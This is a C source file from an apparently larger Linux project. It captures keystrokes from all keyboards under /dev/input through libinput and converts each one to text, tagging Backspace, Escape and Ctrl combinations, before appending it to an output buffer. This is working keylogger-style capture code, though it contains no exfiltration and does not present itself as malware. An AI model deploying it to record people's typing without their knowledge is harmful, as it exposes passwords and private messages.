/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../config/config.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <libinput.h>

#define test_bit(bit, array) ((array)[(bit) / 8] & (1 << ((bit) % 8)))

static pthread_t listener_thread;
static int listener_started;
static volatile int stopping;

static int shift_active;
static int caps_lock_active;
static int ctrl_active;
static int alt_active;

static int is_keyboard(const char *devpath)
{
    int fd = open(devpath, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return 0;

    unsigned char evbits[EV_MAX / 8 + 1] = {0};
    unsigned char keybits[KEY_MAX / 8 + 1] = {0};

    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), evbits) < 0) {
        close(fd);
        return 0;
    }

    int result = 0;
    if (test_bit(EV_KEY, evbits)) {
        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybits)), keybits) >= 0) {
            if (test_bit(KEY_A, keybits) && test_bit(KEY_Z, keybits) &&
                test_bit(KEY_ENTER, keybits) && test_bit(KEY_SPACE, keybits)) {
                result = 1;
            }
        }
    }

    close(fd);
    return result;
}

static int open_restricted(const char *path, int flags, void *user_data)
{
    (void)user_data;
    int fd = open(path, flags);
    return fd < 0 ? -errno : fd;
}

static void close_restricted(int fd, void *user_data)
{
    (void)user_data;
    close(fd);
}

static const struct libinput_interface libinput_iface = {
    .open_restricted = open_restricted,
    .close_restricted = close_restricted,
};

static void translate_and_emit_key(uint32_t key, int pressed)
{
    if (key == KEY_LEFTSHIFT || key == KEY_RIGHTSHIFT) {
        shift_active = pressed;
        return;
    }
    if (key == KEY_LEFTCTRL || key == KEY_RIGHTCTRL) {
        ctrl_active = pressed;
        return;
    }
    if (key == KEY_LEFTALT || key == KEY_RIGHTALT) {
        alt_active = pressed;
        return;
    }
    if (key == KEY_CAPSLOCK && pressed) {
        caps_lock_active = !caps_lock_active;
        return;
    }

    if (!pressed)
        return;

    char buf[32];
    int len = 0;

    if (key >= KEY_1 && key <= KEY_9) {
        static const char shift_num[] = "!@#$%^&*(";
        char ch = shift_active ? shift_num[key - KEY_1] : (char)('1' + (key - KEY_1));
        buf[0] = ch;
        len = 1;
    } else if (key == KEY_0) {
        buf[0] = shift_active ? ')' : '0';
        len = 1;
    } else if (key >= KEY_Q && key <= KEY_P) {
        static const char *row1 = "qwertyuiop";
        char ch = row1[key - KEY_Q];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        buf[0] = ch;
        len = 1;
    } else if (key >= KEY_A && key <= KEY_L) {
        static const char *row2 = "asdfghjkl";
        char ch = row2[key - KEY_A];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        buf[0] = ch;
        len = 1;
    } else if (key >= KEY_Z && key <= KEY_M) {
        static const char *row3 = "zxcvbnm";
        char ch = row3[key - KEY_Z];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        buf[0] = ch;
        len = 1;
    } else {
        switch (key) {
        case KEY_ENTER:
        case KEY_KPENTER:
            buf[0] = '\n';
            len = 1;
            break;
        case KEY_SPACE:
            buf[0] = ' ';
            len = 1;
            break;
        case KEY_TAB:
            buf[0] = '\t';
            len = 1;
            break;
        case KEY_BACKSPACE:
            len = snprintf(buf, sizeof(buf), "[BS]");
            break;
        case KEY_ESC:
            len = snprintf(buf, sizeof(buf), "[ESC]");
            break;
        case KEY_MINUS:
            buf[0] = shift_active ? '_' : '-';
            len = 1;
            break;
        case KEY_EQUAL:
            buf[0] = shift_active ? '+' : '=';
            len = 1;
            break;
        case KEY_LEFTBRACE:
            buf[0] = shift_active ? '{' : '[';
            len = 1;
            break;
        case KEY_RIGHTBRACE:
            buf[0] = shift_active ? '}' : ']';
            len = 1;
            break;
        case KEY_SEMICOLON:
            buf[0] = shift_active ? ':' : ';';
            len = 1;
            break;
        case KEY_APOSTROPHE:
            buf[0] = shift_active ? '"' : '\'';
            len = 1;
            break;
        case KEY_GRAVE:
            buf[0] = shift_active ? '~' : '`';
            len = 1;
            break;
        case KEY_BACKSLASH:
            buf[0] = shift_active ? '|' : '\\';
            len = 1;
            break;
        case KEY_COMMA:
            buf[0] = shift_active ? '<' : ',';
            len = 1;
            break;
        case KEY_DOT:
            buf[0] = shift_active ? '>' : '.';
            len = 1;
            break;
        case KEY_SLASH:
            buf[0] = shift_active ? '?' : '/';
            len = 1;
            break;
        case KEY_KP0: case KEY_KP1: case KEY_KP2: case KEY_KP3: case KEY_KP4:
        case KEY_KP5: case KEY_KP6: case KEY_KP7: case KEY_KP8: case KEY_KP9:
            buf[0] = (char)('0' + (key - KEY_KP0));
            len = 1;
            break;
        case KEY_KPDOT:
            buf[0] = '.';
            len = 1;
            break;
        case KEY_KPPLUS:
            buf[0] = '+';
            len = 1;
            break;
        case KEY_KPMINUS:
            buf[0] = '-';
            len = 1;
            break;
        case KEY_KPASTERISK:
            buf[0] = '*';
            len = 1;
            break;
        case KEY_KPSLASH:
            buf[0] = '/';
            len = 1;
            break;
        default:
            break;
        }
    }

    if (len > 0) {
        if (ctrl_active && key != KEY_LEFTCTRL && key != KEY_RIGHTCTRL) {
            char mod_buf[48];
            int mod_len = snprintf(mod_buf, sizeof(mod_buf), "[Ctrl+%.*s]", len, buf);
            if (mod_len > 0)
                keyboard_output_append(mod_buf, (size_t)mod_len);
        } else {
            keyboard_output_append(buf, (size_t)len);
        }
    }
}

static void handle_keyboard_event(struct libinput_event *event)
{
    struct libinput_event_keyboard *kb = libinput_event_get_keyboard_event(event);
    uint32_t key = libinput_event_keyboard_get_key(kb);
    enum libinput_key_state state = libinput_event_keyboard_get_key_state(kb);

    translate_and_emit_key(key, state == LIBINPUT_KEY_STATE_PRESSED);
}

static void drain_events(struct libinput *li)
{
    struct libinput_event *event;

    while ((event = libinput_get_event(li)) != NULL) {
        enum libinput_event_type type = libinput_event_get_type(event);

        switch (type) {
        case LIBINPUT_EVENT_KEYBOARD_KEY:
            handle_keyboard_event(event);
            break;
        case LIBINPUT_EVENT_DEVICE_ADDED:
            c2t_log_debug("keyboard", "Input device attached");
            break;
        case LIBINPUT_EVENT_DEVICE_REMOVED:
            c2t_log_debug("keyboard", "Input device removed");
            break;
        default:
            break;
        }

        libinput_event_destroy(event);
    }
}

static int attach_keyboards(struct libinput *li)
{
    const char *dir = "/dev/input";
    DIR *d = opendir(dir);
    if (!d) {
        c2t_log_error("keyboard", "Unable to open %s: %s", dir, strerror(errno));
        return 0;
    }

    struct dirent *entry;
    char path[256];
    int count = 0;

    while ((entry = readdir(d)) != NULL) {
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);

        if (is_keyboard(path)) {
            struct libinput_device *dev = libinput_path_add_device(li, path);
            if (dev) {
                c2t_log_info("keyboard", "Listening on keyboard device: %s (%s)",
                             path, libinput_device_get_name(dev));
                count++;
            } else {
                c2t_log_warning("keyboard", "Failed to add device %s to libinput", path);
            }
        }
    }

    closedir(d);
    return count;
}

int keyboard_listen(void)
{
    struct libinput *li = libinput_path_create_context(&libinput_iface, NULL);
    if (!li) {
        c2t_log_error("keyboard", "Unable to create libinput context");
        return 1;
    }

    int count = attach_keyboards(li);
    if (count == 0) {
        c2t_log_warning("keyboard", "No keyboard devices found in /dev/input");
    }

    int li_fd = libinput_get_fd(li);
    if (li_fd < 0) {
        c2t_log_error("keyboard", "Invalid libinput descriptor");
        libinput_unref(li);
        return 1;
    }

    int stop_fd = c2t_runtime_stop_descriptor();
    struct pollfd pfds[2];
    int nfds = 1;

    pfds[0].fd = li_fd;
    pfds[0].events = POLLIN;
    pfds[0].revents = 0;

    if (stop_fd >= 0) {
        pfds[1].fd = stop_fd;
        pfds[1].events = POLLIN;
        pfds[1].revents = 0;
        nfds = 2;
    }

    int rc = 0;
    libinput_dispatch(li);
    drain_events(li);

    while (!stopping && !c2t_runtime_stop_requested()) {
        int n = poll(pfds, (nfds_t)nfds, 1000);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            c2t_log_error("keyboard", "poll() failed: %s", strerror(errno));
            rc = 1;
            break;
        }

        if (stopping || c2t_runtime_stop_requested())
            break;

        if (n == 0)
            continue;

        if (stop_fd >= 0 && (pfds[1].revents & POLLIN))
            break;

        if (pfds[0].revents & (POLLHUP | POLLERR)) {
            c2t_log_warning("keyboard", "libinput descriptor error or hangup");
            rc = 1;
            break;
        }

        if (pfds[0].revents & POLLIN) {
            if (libinput_dispatch(li) != 0) {
                c2t_log_error("keyboard", "libinput_dispatch() failed");
                rc = 1;
                break;
            }
            drain_events(li);
        }
    }

    keyboard_output_flush();
    libinput_unref(li);
    return rc;
}

static void *listener_worker([[maybe_unused]] void *context)
{
    (void)keyboard_listen();
    return nullptr;
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    shift_active = 0;
    caps_lock_active = 0;
    ctrl_active = 0;
    alt_active = 0;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 256 * 1024);
    listener_started = (pthread_create(&listener_thread, &attr, listener_worker, nullptr) == 0);
    pthread_attr_destroy(&attr);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    (void)pthread_join(listener_thread, nullptr);
    listener_started = 0;
}